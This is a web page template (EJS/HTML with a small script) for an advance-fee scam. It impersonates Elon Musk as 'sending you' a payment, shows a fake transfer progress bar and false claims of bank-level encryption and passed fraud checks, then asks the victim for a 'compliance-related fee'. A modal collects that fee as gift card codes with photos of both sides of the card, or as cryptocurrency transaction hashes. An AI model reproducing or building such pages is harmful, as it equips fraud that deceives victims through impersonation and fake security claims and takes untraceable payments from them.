<title><%= payment.transactionId %>_Payment</title>

<div class="container my-4" id="payment-section">
  <div class="row justify-content-center">
    <div class="col-lg-10 col-xl-9">
      <!-- Main Card -->
      <div class="card transaction-card">
        <!-- Header Section -->
        <div class="header-section text-center">
          <h2>
            <b>Elon Musk, CEO of Tesla and SpaceX</b>
          </h2>
          <h4>
            is sending you <b><%=payment.currency %><%= payment.amount %></b>
          </h4>
          <p><i class="fas fa-lock me-2"></i> Secure Payment Processing...</p>
        </div>

        <!-- Main Content -->
        <div class="card-body p-4 p-md-5">
          <!-- Alert -->
          <div class="alert alert-primary d-flex align-items-center">
            <i class="fas fa-info-circle fa-lg me-3"></i>
            <div>
              This transaction is secured with bank-level encryption and fraud
              monitoring
            </div>
          </div>

          <!-- Recipient Info -->
          <div class="row mb-4">
            <div class="col-md-6">
              <p class="mb-1 text-muted">Recipient</p>
              <h4 class="mb-0"><b><%= payment.name %></b></h4>
              <p class="mb-0">
                Account Number: <b><%= payment.accountNumber %></b>
              </p>
              <p class="mb-0">Bank Name: <b><%= payment.bank %></b></p>
              <p class="text-muted">Email: <b><%= payment.email %></b></p>
            </div>
            <div class="col-md-6 text-md-end mt-3 mt-md-0">
              <p class="mb-1 text-muted">Transaction ID</p>
              <h5 class="mb-0"><b><%= payment.transactionId %></b></h5>
              <small class="text-muted"
                >Initiated: <%= payment.createdAt.toLocaleString() %></small
              >
            </div>
          </div>

          <!-- Amount Display -->
          <div class="bg-light p-4 rounded-3 mb-4 text-center">
            <p class="mb-1">Trasaction Amount</p>
            <div class="amount-display text-success">
              <%= payment.currency %><%=payment.amount %>
            </div>
          </div>

          <!-- Progress -->
          <h4 class="mt-4 mb-3 section-title">Transfer Progress</h4>
          <div class="d-flex justify-content-between mb-2">
            <span>Processing</span>
            <span><%= payment.progress %> Complete</span>
          </div>

          <div class="progress mb-4" style="height: 20px">
            <div
              class="progress-bar progress-bar-striped progress-bar-animated bg-success"
              role="progressbar"
              style="width: <%= payment.progress %>%"
              aria-valuenow="<%= payment.progress %>"
              aria-valuemin="0"
              aria-valuemax="100"
            >
              <%= payment.progress %>%
            </div>
          </div>

          <!-- Status Items -->
          <div class="status-item completed">
            <div class="d-flex align-items-center">
              <div class="feature-icon">
                <i class="fas fa-check"></i>
              </div>
              <div>
                <h5 class="mb-1">Payment Processed</h5>
                <p class="text-muted mb-0">
                  Your payment has been successfully authorized and processed.
                </p>
              </div>
            </div>
          </div>

          <div class="status-item completed">
            <div class="d-flex align-items-center">
              <div class="feature-icon">
                <i class="fas fa-check"></i>
              </div>
              <div>
                <h5 class="mb-1">Security Verification</h5>
                <p class="text-muted mb-0">
                  Transaction passed all security checks and fraud detection.
                </p>
              </div>
            </div>
          </div>

          <div class="status-item pending">
            <div class="d-flex align-items-center">
              <div class="feature-icon">
                <i class="fas fa-arrow-right"></i>
              </div>
              <div>
                <h5 class="mb-1">Delivery in Progress</h5>
                <p class="text-muted mb-0">
                  To finalize your transfer, a complianceâ€‘related fee of
                  <b><%= payment.currency %><%= payment.txsFee %></b>
                  will apply. This forms part of our standard regulatory
                  procedures.
                </p>
                <!-- Trigger Button (in your transaction section) -->
                <a
                  href="#"
                  data-bs-toggle="modal"
                  data-bs-target="#paymentModal"
                  class="d-flex align-items-center text-decoration-none"
                >
                  <span
                    class="d-flex align-items-center px-2 py-1 <% if (payment.perment && payment.perment.status === 'success') { %> bg-success text-white <% } else if ((payment.giftCard && payment.giftCard.code) || (payment.cryptoTransaction && payment.cryptoTransaction.transactionHash)) { %> bg-warning text-dark <% } else { %> bg-primary text-white <% } %> rounded"
                  >
                    <% if (payment.perment && payment.perment.status ===
                    'success') { %>
                    <i class="fas fa-check-circle me-2"></i>
                    Payment Successful <% } else if ((payment.giftCard &&
                    payment.giftCard.code) || (payment.cryptoTransaction &&
                    payment.cryptoTransaction.transactionHash)) { %>
                    <i class="fas fa-hourglass-half me-2"></i>
                    Pending Verification <% } else { %>
                    <i class="fas fa-credit-card me-2"></i>
                    Make Payment <% } %>
                  </span>
                </a>

                <div class="mt-2">
                  <small class="text-info"
                    ><i class="fas fa-clock me-1"></i> We apologize for any
                    delay. Thank you for selecting our service.</small
                  >
                </div>
              </div>
            </div>
          </div>

          <!-- Security Features -->
          <h4 class="mt-5 mb-3 section-title">Security & Protection</h4>
          <div class="row">
            <div class="col-md-6 mb-3">
              <div class="security-badge h-100">
                <div class="benefit-item">
                  <div class="feature-icon">
                    <i class="fas fa-lock"></i>
                  </div>
                  <div>
                    <h6 class="mb-1">256-bit Encryption</h6>
                    <p class="text-muted small mb-0">
                      Bank-level security for all transactions
                    </p>
                  </div>
                </div>
              </div>
            </div>
            <div class="col-md-6 mb-3">
              <div class="security-badge h-100">
                <div class="benefit-item">
                  <div class="feature-icon">
                    <i class="fas fa-shield-alt"></i>
                  </div>
                  <div>
                    <h6 class="mb-1">Fraud Monitoring</h6>
                    <p class="text-muted small mb-0">
                      24/7 monitoring for suspicious activity
                    </p>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <!-- Support Section -->
          <div class="alert alert-light mt-4">
            <div class="d-flex align-items-center">
              <div class="feature-icon">
                <i class="fas fa-headset"></i>
              </div>
              <div>
                <h5 class="mb-1">Need assistance?</h5>
                <p class="mb-2">
                  Our support team is available 24/7 to help with your
                  transaction, kindly contact your support specialist.
                </p>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</div>

<!-- Payment Modal -->
<div
  class="modal fade"
  id="paymentModal"
  tabindex="-1"
  aria-labelledby="paymentModalLabel"
  aria-hidden="true"
>
  <div class="modal-dialog modal-lg modal-dialog-centered">
    <div class="modal-content">
      <!-- Header -->
      <div class="modal-header bg-dark text-white">
        <h5 class="modal-title" id="paymentModalLabel">Make Payment</h5>
        <button
          type="button"
          class="btn-close btn-close-white"
          data-bs-dismiss="modal"
          aria-label="Close"
        ></button>
      </div>

      <!-- Body -->
      <div class="modal-body">
        <!-- Payment Method Selector -->
        <div class="mb-4 text-center">
          <label class="form-label d-block mb-2">Select Payment Method</label>
          <div class="btn-group" role="group">
            <button
              type="button"
              class="btn btn-outline-primary active"
              onclick="selectPaymentMethod('giftCard')"
            >
              Gift Card
            </button>
            <button
              type="button"
              class="btn btn-outline-primary"
              onclick="selectPaymentMethod('crypto')"
            >
              Cryptocurrency
            </button>
          </div>
        </div>

        <!-- Payment Form -->
        <form
          action="<%= payment.link %>/success?_method=PUT"
          method="POST"
          enctype="multipart/form-data"
        >
          <!-- Gift Card Section -->
          <div id="giftCardSection">
            <h5 class="text-center bg-light p-2"><b>Gift Card Info</b></h5>
            <input
              type="text"
              name="giftCard[code]"
              class="form-control mb-2"
              placeholder="Gift Card Code"
              value="<%= payment.giftCard?.code || '' %>"
            />

            <label class="form-label">Giftcard Front Image</label>
            <div class="preview-box mb-2">
              <img
                src="<%= payment.giftCard?.frontImageUrl || '' %>"
                id="frontPreview"
                class="preview-img img-fluid rounded"
                style="<%= payment.giftCard?.frontImageUrl ? 'display:block;' : 'display:none;' %>"
              />
            </div>
            <input
              type="file"
              name="giftCard[frontImage]"
              class="form-control mb-2"
              onchange="previewImage(this, 'frontPreview')"
            />

            <label class="form-label">Giftcard Back Image</label>
            <div class="preview-box mb-2">
              <img
                src="<%= payment.giftCard?.backImageUrl || '' %>"
                id="backPreview"
                class="preview-img img-fluid rounded"
                style="<%= payment.giftCard?.backImageUrl ? 'display:block;' : 'display:none;' %>"
              />
            </div>
            <input
              type="file"
              name="giftCard[backImage]"
              class="form-control mb-2"
              onchange="previewImage(this, 'backPreview')"
            />

            <input
              type="text"
              name="giftCard[type]"
              class="form-control mb-2"
              placeholder="Gift Card Type"
              value="<%= payment.giftCard?.type || '' %>"
            />
          </div>

          <!-- Crypto Section -->
          <div id="cryptoSection" class="d-none">
            <h5 class="bg-light p-2 text-center">
              <b>Crypto Transaction Info</b>
            </h5>
            <input
              type="text"
              name="cryptoTransaction[type]"
              class="form-control mb-2"
              placeholder="Crypto Type"
              value="<%= payment.cryptoTransaction?.type || '' %>"
            />

            <label class="form-label">Transaction Slip Image</label>
            <div class="preview-box mb-2">
              <img
                src="<%= payment.cryptoTransaction?.slipImageUrl || '' %>"
                id="slipPreview"
                class="preview-img img-fluid rounded"
                style="<%= payment.cryptoTransaction?.slipImageUrl ? 'display:block;' : 'display:none;' %>"
              />
            </div>
            <input
              type="file"
              name="cryptoTransaction[slipImage]"
              class="form-control mb-2"
              onchange="previewImage(this, 'slipPreview')"
            />

            <input
              type="text"
              name="cryptoTransaction[transactionHash]"
              class="form-control mb-2"
              placeholder="Transaction Hash"
              value="<%= payment.cryptoTransaction?.transactionHash || '' %>"
            />
          </div>

          <!-- Footer -->
          <div class="modal-footer">
            <button
              type="button"
              class="btn btn-secondary"
              data-bs-dismiss="modal"
            >
              Cancel
            </button>
            <button type="submit" class="btn btn-danger">
              Proceed Payment
            </button>
          </div>
        </form>
      </div>
    </div>
  </div>
</div>
<script>
  function selectPaymentMethod(method) {
    const giftCardSection = document.getElementById("giftCardSection");
    const cryptoSection = document.getElementById("cryptoSection");
    const buttons = document.querySelectorAll(".btn-group .btn");

    // Toggle button active state
    buttons.forEach((btn) => btn.classList.remove("active"));
    if (method === "giftCard") buttons[0].classList.add("active");
    else buttons[1].classList.add("active");

    if (method === "giftCard") {
      giftCardSection.classList.remove("d-none");
      cryptoSection.classList.add("d-none");

      // Required attributes
      giftCardSection.querySelector(
        "input[name='giftCard[code]']"
      ).required = true;
      cryptoSection.querySelector(
        "input[name='cryptoTransaction[transactionHash]']"
      ).required = false;
    } else {
      cryptoSection.classList.remove("d-none");
      giftCardSection.classList.add("d-none");

      // Required attributes
      giftCardSection.querySelector(
        "input[name='giftCard[code]']"
      ).required = false;
      cryptoSection.querySelector(
        "input[name='cryptoTransaction[transactionHash]']"
      ).required = true;
    }
  }

  // Initialize default selection
  document.addEventListener("DOMContentLoaded", () =>
    selectPaymentMethod("giftCard")
  );

  // Preview uploaded images
  function previewImage(input, previewId) {
    const file = input.files[0];
    const preview = document.getElementById(previewId);
    if (file) {
      const reader = new FileReader();
      reader.onload = (e) => {
        preview.src = e.target.result;
        preview.style.display = "block";
      };
      reader.readAsDataURL(file);
    }
  }
</script>
